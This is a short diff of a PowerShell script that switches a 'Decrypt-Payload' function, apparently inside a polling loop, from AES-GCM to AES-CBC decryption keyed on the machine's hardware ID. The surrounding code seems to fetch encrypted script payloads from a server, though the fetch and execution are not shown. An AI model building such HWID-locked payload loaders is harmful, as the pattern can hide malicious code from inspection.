@@ -164,19 +164,19 @@ while ($true) {
             
             if ($scriptResponse.success) {
                 if ($scriptResponse.encrypted) {
+                    # เปลี่ยนมาใช้ AES-CBC ที่รองรับทุกเวอร์ชัน Windows
                     function Decrypt-Payload($encDataHex, $ivHex, $hwid) {
-                        $aes = [System.Security.Cryptography.AesGcm]::new(
-                            [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
-                        )
-                        $iv = [byte[]]($ivHex -split '(.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
+                        $aes = [System.Security.Cryptography.Aes]::Create()
+                        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+                        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+                        
+                        $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($hwid.PadRight(32, '0').Substring(0, 32))
+                        $aes.IV = [byte[]]($ivHex -split '(.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
+                        
                         $cipherBytes = [byte[]]($encDataHex -split '(.{2})' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16) })
                         
-                        $tagSize = 16
-                        $actualCipher = $cipherBytes[0 .. ($cipherBytes.Length - $tagSize - 1)]
-                        $tag = $cipherBytes[($cipherBytes.Length - $tagSize) .. ($cipherBytes.Length - 1)]
-                        
-                        $plainBytes = New-Object byte[] $actualCipher.Length
-                        $aes.Decrypt($iv, $actualCipher, $tag, $plainBytes)
+                        $decryptor = $aes.CreateDecryptor()
+                        $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
                         return [System.Text.Encoding]::UTF8.GetString($plainBytes)
                     }
 
